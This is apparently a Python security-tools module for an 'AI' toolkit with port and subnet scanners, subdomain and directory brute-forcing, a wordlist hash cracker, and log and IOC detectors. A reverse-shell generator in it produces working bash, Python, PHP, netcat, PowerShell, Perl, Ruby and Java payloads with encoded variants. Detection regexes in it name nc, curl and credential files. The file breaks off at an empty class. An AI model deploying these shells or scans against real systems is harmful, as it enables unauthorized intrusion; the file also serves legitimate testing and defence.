"""
Vajra AI — Security Tools Module
Provides executable security tools for reconnaissance, assessment, and defense.
All tools are for AUTHORIZED testing & legitimate security operations only.
"""

import socket
import struct
import json
import time
import re
import os
import hashlib
import base64
import threading
import subprocess
import urllib.request
import urllib.error
import urllib.parse
import ssl
import concurrent.futures
from datetime import datetime


# ── Port Scanner ───────────────────────────────────────────────────────

class PortScanner:
    """Multi-threaded TCP port scanner with service detection."""

    COMMON_PORTS = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPCbind", 135: "MSRPC",
        139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
        993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
        2049: "NFS", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
        5900: "VNC", 5985: "WinRM", 6379: "Redis", 8080: "HTTP-Proxy",
        8443: "HTTPS-Alt", 8888: "HTTP-Alt", 9090: "Web-Console",
        27017: "MongoDB",
    }

    @staticmethod
    def scan_port(target, port, timeout=1.5):
        """Scan a single TCP port."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((target, port))
            banner = ""
            if result == 0:
                try:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()[:200]
                except Exception:
                    pass
            sock.close()
            return result == 0, banner
        except Exception:
            return False, ""

    @classmethod
    def scan(cls, target, ports="1-1024", threads=100, timeout=1.5):
        """Run a multi-threaded port scan."""
        start_time = time.time()
        results = {
            "target": target,
            "status": "running",
            "open_ports": [],
            "scan_time": 0,
            "total_scanned": 0,
            "error": None,
        }

        # Resolve hostname
        try:
            ip = socket.gethostbyname(target)
            results["ip"] = ip
        except socket.gaierror:
            results["status"] = "error"
            results["error"] = f"Cannot resolve hostname: {target}"
            return results

        # Parse port range
        port_list = cls._parse_ports(ports)
        results["total_scanned"] = len(port_list)

        open_ports = []

        def _scan_single(port):
            is_open, banner = cls.scan_port(ip, port, timeout)
            if is_open:
                service = cls.COMMON_PORTS.get(port, "unknown")
                return {
                    "port": port,
                    "state": "open",
                    "service": service,
                    "banner": banner,
                }
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(_scan_single, p): p for p in port_list}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)

        open_ports.sort(key=lambda x: x["port"])
        results["open_ports"] = open_ports
        results["scan_time"] = round(time.time() - start_time, 2)
        results["status"] = "completed"
        return results

    @staticmethod
    def _parse_ports(port_str):
        """Parse port specification: '80', '1-1024', '80,443,8080', 'top100'."""
        port_str = str(port_str).strip().lower()
        if port_str == "top100":
            return [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
                    993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985,
                    6379, 8080, 8443, 8888, 9090, 27017, 49152, 49153, 49154]
        if port_str in ("top1000", "common"):
            return list(range(1, 1025))

        ports = set()
        for part in port_str.split(","):
            part = part.strip()
            if "-" in part:
                start, end = part.split("-", 1)
                ports.update(range(int(start), int(end) + 1))
            else:
                ports.add(int(part))
        return sorted(p for p in ports if 1 <= p <= 65535)


# ── Network Discovery ──────────────────────────────────────────────────

class NetworkScanner:
    """Discover live hosts on a network via TCP ping."""

    @staticmethod
    def ping_host(ip, timeout=1):
        """Check if a host is alive via TCP connect to common ports."""
        for port in [80, 443, 22, 445, 3389]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    return True
            except Exception:
                pass
        return False

    @classmethod
    def discover(cls, network, timeout=1, threads=50):
        """Discover live hosts in a /24 network."""
        start_time = time.time()
        results = {
            "network": network,
            "status": "running",
            "hosts": [],
            "scan_time": 0,
            "error": None,
        }

        # Parse network — support CIDR /24 or base IP
        base_ip = network.replace("/24", "").strip()
        parts = base_ip.split(".")
        if len(parts) != 4:
            results["status"] = "error"
            results["error"] = "Invalid network format. Use: 192.168.1.0/24 or 192.168.1.0"
            return results

        base = ".".join(parts[:3])
        ips = [f"{base}.{i}" for i in range(1, 255)]

        live_hosts = []

        def _check(ip):
            if cls.ping_host(ip, timeout):
                try:
                    hostname = socket.getfqdn(ip)
                except Exception:
                    hostname = ""
                return {"ip": ip, "hostname": hostname if hostname != ip else ""}
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(_check, ip): ip for ip in ips}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    live_hosts.append(result)

        live_hosts.sort(key=lambda h: list(map(int, h["ip"].split("."))))
        results["hosts"] = live_hosts
        results["scan_time"] = round(time.time() - start_time, 2)
        results["status"] = "completed"
        return results


# ── Subdomain Enumerator ───────────────────────────────────────────────

class SubdomainEnumerator:
    """Discover subdomains via DNS resolution and public APIs."""

    WORDLIST = [
        "www", "mail", "ftp", "remote", "blog", "webmail", "server", "ns1", "ns2",
        "smtp", "mx", "secure", "vpn", "api", "dev", "staging", "test", "admin",
        "portal", "m", "mobile", "app", "docs", "support", "help", "forum",
        "shop", "store", "cdn", "media", "static", "assets", "img", "images",
        "video", "cloud", "git", "svn", "code", "jenkins", "ci", "build",
        "status", "monitor", "dashboard", "grafana", "kibana", "elastic",
        "redis", "db", "database", "mysql", "postgres", "mongo", "search",
        "auth", "login", "sso", "oauth", "iam", "ldap", "ad", "exchange",
        "owa", "autodiscover", "internal", "intranet", "extranet", "crm",
        "erp", "hr", "jira", "confluence", "wiki", "slack", "chat",
        "proxy", "gateway", "lb", "load", "balancer", "edge", "waf",
        "backup", "bak", "old", "new", "beta", "alpha", "demo", "sandbox",
        "staging2", "dev2", "uat", "qa", "preprod", "production", "prod",
        "web", "web1", "web2", "app1", "app2", "srv", "srv1", "node1",
        "cpanel", "whm", "plesk", "panel", "manage", "manager",
    ]

    @classmethod
    def enumerate(cls, domain, use_crtsh=True, threads=30):
        """Enumerate subdomains for a given domain."""
        start_time = time.time()
        results = {
            "domain": domain,
            "status": "running",
            "subdomains": [],
            "scan_time": 0,
            "error": None,
        }

        found = set()

        # Method 1: certificate transparency via crt.sh
        if use_crtsh:
            try:
                ctx = ssl.create_default_context()
                url = f"https://crt.sh/?q=%25.{domain}&output=json"
                req = urllib.request.Request(url, headers={"User-Agent": "Vajra-Security-Scanner/1.0"})
                with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                    data = json.loads(resp.read().decode())
                    for entry in data:
                        name = entry.get("name_value", "")
                        for sub in name.split("\n"):
                            sub = sub.strip().lower()
                            if sub.endswith(f".{domain}") and "*" not in sub:
                                found.add(sub)
            except Exception:
                pass  # crt.sh may be unavailable

        # Method 2: DNS brute force
        def _resolve(subdomain):
            fqdn = f"{subdomain}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                return fqdn, ip
            except socket.gaierror:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(_resolve, sub): sub for sub in cls.WORDLIST}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    fqdn, ip = result
                    found.add(fqdn)

        # Resolve all found subdomains
        subdomain_list = []
        for sub in sorted(found):
            try:
                ip = socket.gethostbyname(sub)
                subdomain_list.append({"subdomain": sub, "ip": ip})
            except Exception:
                subdomain_list.append({"subdomain": sub, "ip": "unresolved"})

        results["subdomains"] = subdomain_list
        results["scan_time"] = round(time.time() - start_time, 2)
        results["status"] = "completed"
        return results


# ── HTTP Header Analyzer ──────────────────────────────────────────────

class HeaderAnalyzer:
    """Analyze HTTP security headers of a target URL."""

    SECURITY_HEADERS = {
        "Strict-Transport-Security": {
            "description": "Forces HTTPS connections (HSTS)",
            "severity": "high",
        },
        "Content-Security-Policy": {
            "description": "Controls resources the browser can load (CSP)",
            "severity": "high",
        },
        "X-Content-Type-Options": {
            "description": "Prevents MIME type sniffing",
            "severity": "medium",
        },
        "X-Frame-Options": {
            "description": "Prevents clickjacking via framing",
            "severity": "medium",
        },
        "X-XSS-Protection": {
            "description": "Enables browser XSS filtering",
            "severity": "low",
        },
        "Referrer-Policy": {
            "description": "Controls referrer header information",
            "severity": "low",
        },
        "Permissions-Policy": {
            "description": "Controls browser feature access",
            "severity": "medium",
        },
        "X-Permitted-Cross-Domain-Policies": {
            "description": "Controls Flash/PDF cross-domain access",
            "severity": "low",
        },
    }

    @classmethod
    def analyze(cls, url):
        """Analyze security headers for a given URL."""
        results = {
            "url": url,
            "status": "running",
            "headers": {},
            "missing_headers": [],
            "info_disclosure": [],
            "score": 0,
            "grade": "",
            "server_info": {},
            "error": None,
        }

        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            results["url"] = url

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={
                "User-Agent": "Vajra-Security-Scanner/1.0",
            })
            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                headers = dict(resp.headers)
                results["http_status"] = resp.status
                results["headers"] = headers

                # Check security headers
                present = 0
                total = len(cls.SECURITY_HEADERS)
                for header, info in cls.SECURITY_HEADERS.items():
                    header_lower = header.lower()
                    found = False
                    for h_key in headers:
                        if h_key.lower() == header_lower:
                            found = True
                            break
                    if not found:
                        results["missing_headers"].append({
                            "header": header,
                            "description": info["description"],
                            "severity": info["severity"],
                        })
                    else:
                        present += 1

                # Check for information disclosure
                server = headers.get("Server", "")
                if server:
                    results["server_info"]["server"] = server
                    if any(v in server.lower() for v in ["apache", "nginx", "iis", "openresty"]):
                        results["info_disclosure"].append({
                            "header": "Server",
                            "value": server,
                            "risk": "Server technology and version disclosed",
                        })

                powered_by = headers.get("X-Powered-By", "")
                if powered_by:
                    results["server_info"]["powered_by"] = powered_by
                    results["info_disclosure"].append({
                        "header": "X-Powered-By",
                        "value": powered_by,
                        "risk": "Technology stack disclosed",
                    })

                # Calculate score
                results["score"] = round((present / total) * 100)
                if results["score"] >= 90:
                    results["grade"] = "A"
                elif results["score"] >= 75:
                    results["grade"] = "B"
                elif results["score"] >= 50:
                    results["grade"] = "C"
                elif results["score"] >= 25:
                    results["grade"] = "D"
                else:
                    results["grade"] = "F"

        except Exception as e:
            results["status"] = "error"
            results["error"] = str(e)
            return results

        results["status"] = "completed"
        return results


# ── Technology Detector ────────────────────────────────────────────────

class TechDetector:
    """Detect technologies used by a web application."""

    SIGNATURES = {
        "WordPress": {"headers": ["x-pingback"], "body": ["wp-content", "wp-includes", "wp-json"]},
        "Drupal": {"headers": ["x-drupal-cache"], "body": ["drupal.js", "sites/default"]},
        "Joomla": {"headers": [], "body": ["joomla", "/media/system/js/"]},
        "React": {"headers": [], "body": ["react", "_reactRootContainer", "__NEXT_DATA__"]},
        "Angular": {"headers": [], "body": ["ng-version", "ng-app", "angular.js"]},
        "Vue.js": {"headers": [], "body": ["vue.js", "__vue__", "vue-router"]},
        "jQuery": {"headers": [], "body": ["jquery", "jQuery"]},
        "Bootstrap": {"headers": [], "body": ["bootstrap.min.css", "bootstrap.min.js"]},
        "Cloudflare": {"headers": ["cf-ray", "cf-cache-status"], "body": []},
        "AWS": {"headers": ["x-amz-"], "body": ["amazonaws.com"]},
        "Nginx": {"headers": [], "body": []},
        "Apache": {"headers": [], "body": []},
        "PHP": {"headers": ["x-powered-by"], "body": [".php"]},
        "ASP.NET": {"headers": ["x-aspnet-version", "x-powered-by"], "body": [".aspx", "__VIEWSTATE"]},
        "Express": {"headers": ["x-powered-by"], "body": []},
        "Django": {"headers": ["x-frame-options"], "body": ["csrfmiddlewaretoken", "django"]},
        "Flask": {"headers": [], "body": []},
        "Laravel": {"headers": [], "body": ["laravel_session", "csrf-token"]},
    }

    @classmethod
    def detect(cls, url):
        """Detect technologies on a target URL."""
        results = {
            "url": url,
            "status": "running",
            "technologies": [],
            "error": None,
        }

        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            results["url"] = url

        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            })
            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
                body = resp.read().decode("utf-8", errors="ignore").lower()

                # Check server header directly
                server = headers.get("server", "")
                if "nginx" in server:
                    results["technologies"].append({"name": "Nginx", "category": "Web Server", "version": server})
                if "apache" in server:
                    results["technologies"].append({"name": "Apache", "category": "Web Server", "version": server})
                if "iis" in server:
                    results["technologies"].append({"name": "IIS", "category": "Web Server", "version": server})

                powered = headers.get("x-powered-by", "")
                if "php" in powered:
                    results["technologies"].append({"name": "PHP", "category": "Language", "version": powered})
                elif "asp.net" in powered:
                    results["technologies"].append({"name": "ASP.NET", "category": "Framework", "version": powered})
                elif "express" in powered:
                    results["technologies"].append({"name": "Express", "category": "Framework", "version": powered})

                # Signature-based detection
                detected_names = {t["name"] for t in results["technologies"]}
                for tech, sigs in cls.SIGNATURES.items():
                    if tech in detected_names:
                        continue
                    # Check headers
                    for h_sig in sigs["headers"]:
                        if any(h_sig in k for k in headers):
                            category = "CDN" if tech == "Cloudflare" else "Technology"
                            results["technologies"].append({"name": tech, "category": category, "version": ""})
                            detected_names.add(tech)
                            break
                    if tech in detected_names:
                        continue
                    # Check body
                    for b_sig in sigs["body"]:
                        if b_sig in body:
                            results["technologies"].append({"name": tech, "category": "Framework/Library", "version": ""})
                            detected_names.add(tech)
                            break

        except Exception as e:
            results["status"] = "error"
            results["error"] = str(e)
            return results

        results["status"] = "completed"
        return results


# ── Directory Bruteforcer ──────────────────────────────────────────────

class DirBruter:
    """Brute-force directories and files on a web server."""

    DEFAULT_WORDLIST = [
        "admin", "login", "dashboard", "wp-admin", "wp-login.php", "administrator",
        "console", "api", "api/v1", "api/v2", "graphql", "swagger", "docs",
        "debug", "test", "dev", "staging", "backup", "backups", "old",
        ".env", ".git", ".git/config", ".htaccess", ".htpasswd",
        "robots.txt", "sitemap.xml", "crossdomain.xml", "security.txt",
        ".well-known/security.txt", "humans.txt", "readme.md", "README.md",
        "config", "config.php", "config.yml", "config.json", "settings",
        "phpinfo.php", "info.php", "server-status", "server-info",
        "phpmyadmin", "pma", "mysql", "database", "db",
        "wp-content", "wp-includes", "wp-config.php.bak",
        "uploads", "upload", "files", "media", "images", "assets",
        "static", "public", "private", "secret", "hidden",
        "cgi-bin", "bin", "scripts", "shell", "cmd",
        "xmlrpc.php", "composer.json", "package.json", "Gruntfile.js",
        "Dockerfile", "docker-compose.yml", ".dockerenv",
        "Makefile", ".travis.yml", "Jenkinsfile",
        "web.config", "applicationhost.config",
        "account", "accounts", "user", "users", "profile",
        "register", "signup", "signin", "logout", "reset", "forgot",
        "search", "results", "download", "export", "import",
        "error", "404", "500", "maintenance",
        "status", "health", "healthcheck", "ping", "version",
        "metrics", "prometheus", "grafana", "kibana",
        "jenkins", "hudson", "bamboo", "teamcity",
        "sonar", "nexus", "artifactory",
        "mailman", "lists", "roundcube", "webmail",
        "nagios", "cacti", "zabbix", "munin",
    ]

    @classmethod
    def bruteforce(cls, url, wordlist=None, extensions=None, threads=20, timeout=5):
        """Brute-force directories/files on a web target."""
        start_time = time.time()
        results = {
            "url": url,
            "status": "running",
            "found": [],
            "scan_time": 0,
            "total_checked": 0,
            "error": None,
        }

        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        url = url.rstrip("/")
        results["url"] = url

        words = wordlist or cls.DEFAULT_WORDLIST
        extensions = extensions or [""]
        paths = []
        for word in words:
            for ext in extensions:
                if ext and not word.endswith(ext):
                    paths.append(f"{word}{ext}")
                else:
                    paths.append(word)

        results["total_checked"] = len(paths)
        found = []

        def _check(path):
            target_url = f"{url}/{path}"
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                req = urllib.request.Request(target_url, headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                })
                with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
                    status = resp.status
                    length = len(resp.read())
                    if status in (200, 301, 302, 303, 307, 401, 403):
                        return {
                            "path": f"/{path}",
                            "status": status,
                            "size": length,
                            "redirect": resp.url if status in (301, 302, 303, 307) else None,
                        }
            except urllib.error.HTTPError as e:
                if e.code in (401, 403):
                    return {
                        "path": f"/{path}",
                        "status": e.code,
                        "size": 0,
                        "redirect": None,
                    }
            except Exception:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(_check, p): p for p in paths}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)

        found.sort(key=lambda x: x["path"])
        results["found"] = found
        results["scan_time"] = round(time.time() - start_time, 2)
        results["status"] = "completed"
        return results


# ── Hash Cracker ───────────────────────────────────────────────────────

class HashCracker:
    """Identify and crack common hash types."""

    HASH_PATTERNS = {
        "MD5": (32, r"^[a-f0-9]{32}$"),
        "SHA1": (40, r"^[a-f0-9]{40}$"),
        "SHA256": (64, r"^[a-f0-9]{64}$"),
        "SHA512": (128, r"^[a-f0-9]{128}$"),
        "NTLM": (32, r"^[a-f0-9]{32}$"),
        "bcrypt": (60, r"^\$2[ayb]\$\d{2}\$[./A-Za-z0-9]{53}$"),
    }

    COMMON_PASSWORDS = [
        "password", "123456", "12345678", "qwerty", "abc123", "monkey",
        "1234567", "letmein", "trustno1", "dragon", "baseball", "iloveyou",
        "master", "sunshine", "ashley", "bailey", "shadow", "123456789",
        "654321", "superman", "qazwsx", "michael", "football", "password1",
        "password123", "batman", "login", "admin", "admin123", "root",
        "toor", "pass", "test", "guest", "welcome", "welcome1",
        "p@ssw0rd", "P@ssw0rd", "P@ssword1", "changeme", "default",
        "password!", "Pa$$w0rd", "qwerty123", "1q2w3e4r", "1qaz2wsx",
        "hunter2", "trustno1", "summer2024", "Winter2024", "Spring2024",
    ]

    @classmethod
    def identify(cls, hash_str):
        """Identify the hash type."""
        hash_str = hash_str.strip()
        if hash_str.startswith("$2"):
            return ["bcrypt"]

        possible = []
        for htype, (length, pattern) in cls.HASH_PATTERNS.items():
            if htype == "bcrypt":
                continue
            if re.match(pattern, hash_str.lower()):
                possible.append(htype)
        return possible if possible else ["Unknown"]

    @classmethod
    def crack(cls, hash_str, wordlist=None):
        """Attempt to crack a hash using a wordlist."""
        start_time = time.time()
        results = {
            "hash": hash_str,
            "status": "running",
            "hash_type": [],
            "cracked": False,
            "plaintext": None,
            "attempts": 0,
            "crack_time": 0,
            "error": None,
        }

        hash_str = hash_str.strip().lower()
        hash_types = cls.identify(hash_str)
        results["hash_type"] = hash_types

        if "bcrypt" in hash_types:
            results["status"] = "completed"
            results["error"] = "bcrypt cracking requires specialized tools (hashcat/john). Not supported in-browser."
            return results

        if "Unknown" in hash_types:
            results["status"] = "error"
            results["error"] = "Unable to identify hash type."
            return results

        passwords = wordlist or cls.COMMON_PASSWORDS
        attempts = 0

        for pwd in passwords:
            attempts += 1
            for htype in hash_types:
                if htype == "MD5" or htype == "NTLM":
                    if hashlib.md5(pwd.encode()).hexdigest() == hash_str:
                        results["cracked"] = True
                        results["plaintext"] = pwd
                        results["hash_type"] = [htype]
                        break
                elif htype == "SHA1":
                    if hashlib.sha1(pwd.encode()).hexdigest() == hash_str:
                        results["cracked"] = True
                        results["plaintext"] = pwd
                        break
                elif htype == "SHA256":
                    if hashlib.sha256(pwd.encode()).hexdigest() == hash_str:
                        results["cracked"] = True
                        results["plaintext"] = pwd
                        break
                elif htype == "SHA512":
                    if hashlib.sha512(pwd.encode()).hexdigest() == hash_str:
                        results["cracked"] = True
                        results["plaintext"] = pwd
                        break
            if results["cracked"]:
                break

        results["attempts"] = attempts
        results["crack_time"] = round(time.time() - start_time, 4)
        results["status"] = "completed"
        return results


# ── Reverse Shell Generator ───────────────────────────────────────────

class PayloadGenerator:
    """Generate reverse shell payloads and encoded payloads."""

    @staticmethod
    def reverse_shell(lhost, lport, shell_type="bash"):
        """Generate a reverse shell payload."""
        lport = str(lport)
        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "php": f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "nc": f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/f",
            "powershell": f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}",
            "perl": f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "java": f"Runtime.getRuntime().exec(new String[]{{\"bash\",\"-c\",\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"}});",
        }

        if shell_type not in shells:
            return {
                "error": f"Unknown shell type. Available: {', '.join(shells.keys())}",
            }

        payload = shells[shell_type]
        return {
            "type": shell_type,
            "lhost": lhost,
            "lport": lport,
            "payload": payload,
            "encoded": {
                "base64": base64.b64encode(payload.encode()).decode(),
                "url": urllib.parse.quote(payload),
            },
            "listener": f"nc -lvnp {lport}",
        }


# ── WHOIS / DNS Lookup ────────────────────────────────────────────────

class DNSRecon:
    """DNS reconnaissance and information gathering."""

    @staticmethod
    def dns_lookup(domain):
        """Perform DNS lookups for a domain."""
        results = {
            "domain": domain,
            "status": "running",
            "records": {},
            "error": None,
        }

        # A record
        try:
            ip = socket.gethostbyname(domain)
            results["records"]["A"] = [ip]
        except Exception:
            results["records"]["A"] = []

        # Get all IPs
        try:
            infos = socket.getaddrinfo(domain, None)
            ips = list(set(info[4][0] for info in infos))
            results["records"]["ALL_IPS"] = ips
        except Exception:
            results["records"]["ALL_IPS"] = []

        # Reverse DNS
        try:
            if results["records"]["A"]:
                rev = socket.gethostbyaddr(results["records"]["A"][0])
                results["records"]["PTR"] = [rev[0]]
        except Exception:
            results["records"]["PTR"] = []

        # MX-like: try common mail subdomains
        mx_subs = ["mail", "mx", "mx1", "mx2", "smtp"]
        mx_records = []
        for sub in mx_subs:
            try:
                ip = socket.gethostbyname(f"{sub}.{domain}")
                mx_records.append({"host": f"{sub}.{domain}", "ip": ip})
            except Exception:
                pass
        results["records"]["MX_GUESS"] = mx_records

        # NS-like: try common NS subdomains
        ns_subs = ["ns1", "ns2", "ns3", "dns", "dns1", "dns2"]
        ns_records = []
        for sub in ns_subs:
            try:
                ip = socket.gethostbyname(f"{sub}.{domain}")
                ns_records.append({"host": f"{sub}.{domain}", "ip": ip})
            except Exception:
                pass
        results["records"]["NS_GUESS"] = ns_records

        results["status"] = "completed"
        return results


# ── Encoder / Decoder ──────────────────────────────────────────────────

class Encoder:
    """Encode and decode payloads in various formats."""

    @staticmethod
    def encode(text, encoding_type="base64"):
        """Encode text in the specified format."""
        try:
            if encoding_type == "base64":
                return base64.b64encode(text.encode()).decode()
            elif encoding_type == "url":
                return urllib.parse.quote(text)
            elif encoding_type == "hex":
                return text.encode().hex()
            elif encoding_type == "html":
                return "".join(f"&#{ord(c)};" for c in text)
            elif encoding_type == "unicode":
                return "".join(f"\\u{ord(c):04x}" for c in text)
            elif encoding_type == "binary":
                return " ".join(format(ord(c), "08b") for c in text)
            elif encoding_type == "md5":
                return hashlib.md5(text.encode()).hexdigest()
            elif encoding_type == "sha1":
                return hashlib.sha1(text.encode()).hexdigest()
            elif encoding_type == "sha256":
                return hashlib.sha256(text.encode()).hexdigest()
            else:
                return None
        except Exception:
            return None

    @staticmethod
    def decode(text, encoding_type="base64"):
        """Decode text from the specified format."""
        try:
            if encoding_type == "base64":
                return base64.b64decode(text).decode("utf-8", errors="ignore")
            elif encoding_type == "url":
                return urllib.parse.unquote(text)
            elif encoding_type == "hex":
                return bytes.fromhex(text).decode("utf-8", errors="ignore")
            elif encoding_type == "binary":
                bits = text.replace(" ", "")
                return "".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
            else:
                return None
        except Exception:
            return None


# ── Log Analyzer (Blue Team) ──────────────────────────────────────────

class LogAnalyzer:
    """Analyze log entries for suspicious patterns and IOCs."""

    SUSPICIOUS_PATTERNS = {
        "brute_force": [
            r"(?i)(failed\s+password|authentication\s+fail|login\s+fail|invalid\s+(user|password))",
            r"(?i)(401\s+unauthorized|403\s+forbidden)",
        ],
        "command_injection": [
            r"(;|\||&&)\s*(cat|ls|whoami|id|uname|wget|curl|nc|bash|sh|python|perl|ruby)",
            r"(?i)(/etc/passwd|/etc/shadow|\.\.\/|%2e%2e)",
        ],
        "sql_injection": [
            r"(?i)(union\s+select|or\s+1\s*=\s*1|'\s*or\s*'|drop\s+table|insert\s+into)",
            r"(?i)(information_schema|sleep\(\d+\)|benchmark\()",
        ],
        "xss_attempt": [
            r"(?i)(<script|javascript:|on(load|error|click)\s*=|alert\(|document\.cookie)",
        ],
        "data_exfil": [
            r"(?i)(base64|gzip|tar|zip).*(/etc/|/var/|C:\\\\|passwd|shadow)",
        ],
        "privilege_escalation": [
            r"(?i)(sudo\s|su\s+root|chmod\s+[47]|chown\s+root|setuid|capability)",
        ],
        "lateral_movement": [
            r"(?i)(psexec|wmiexec|winrm|smbexec|dcomexec|evil-winrm)",
        ],
    }

    @classmethod
    def analyze(cls, log_text, log_type="auto"):
        """Analyze log text for suspicious patterns."""
        start = time.time()
        lines = [l.strip() for l in log_text.strip().split("\n") if l.strip()]
        results = {
            "status": "completed",
            "total_lines": len(lines),
            "findings": [],
            "summary": {},
            "risk_level": "low",
            "analysis_time": 0,
        }

        finding_counts = {}
        for i, line in enumerate(lines, 1):
            for category, patterns in cls.SUSPICIOUS_PATTERNS.items():
                for pattern in patterns:
                    if re.search(pattern, line):
                        finding_counts[category] = finding_counts.get(category, 0) + 1
                        if len(results["findings"]) < 50:  # Cap findings
                            results["findings"].append({
                                "line_number": i,
                                "category": category,
                                "line": line[:300],
                            })

        results["summary"] = finding_counts
        total = sum(finding_counts.values())
        if total > 20:
            results["risk_level"] = "critical"
        elif total > 10:
            results["risk_level"] = "high"
        elif total > 3:
            results["risk_level"] = "medium"
        results["analysis_time"] = round(time.time() - start, 2)
        return results


class IOCScanner:
    """Extract and classify Indicators of Compromise from text."""

    IOC_PATTERNS = {
        "ipv4": r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b",
        "ipv6": r"(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}",
        "domain": r"\b(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b",
        "url": r"https?://[^\s\"'<>]+",
        "email": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b",
        "md5": r"\b[a-fA-F0-9]{32}\b",
        "sha1": r"\b[a-fA-F0-9]{40}\b",
        "sha256": r"\b[a-fA-F0-9]{64}\b",
        "cve": r"CVE-\d{4}-\d{4,7}",
        "file_path_win": r"[A-Za-z]:\\[\w\\. -]+",
        "file_path_unix": r"(?:/[\w.-]+){2,}",
        "registry_key": r"(?i)(HKLM|HKCU|HKCR|HKU|HKCC)\\[\w\\]+",
    }

    KNOWN_MALICIOUS_PATTERNS = [
        r"(?i)(cobalt\s*strike|mimikatz|metasploit|empire|covenant)",
        r"(?i)(powershell.*-enc|hidden.*-exec\s*bypass|iex.*downloadstring)",
        r"(?i)(\.exe\.txt|\.scr|\.hta|\.vbs|\.js\.exe)",
    ]

    @classmethod
    def scan(cls, text):
        """Extract IOCs from text."""
        results = {
            "status": "completed",
            "iocs": {},
            "total_iocs": 0,
            "malicious_indicators": [],
        }
        for ioc_type, pattern in cls.IOC_PATTERNS.items():
            matches = list(set(re.findall(pattern, text)))
            if matches:
                # Filter out common false positives
                if ioc_type == "ipv4":
                    matches = [m for m in matches if not m.startswith(("0.", "127.", "255."))]
                if ioc_type == "domain":
                    matches = [m for m in matches if m.count(".") >= 1 and len(m) > 4
                               and not m.endswith((".local", ".internal", ".test"))]
                if matches:
                    results["iocs"][ioc_type] = matches[:50]
                    results["total_iocs"] += len(matches[:50])

        for pattern in cls.KNOWN_MALICIOUS_PATTERNS:
            found = re.findall(pattern, text)
            if found:
                results["malicious_indicators"].extend(list(set(found)))

        return results


class ConfigAuditor:
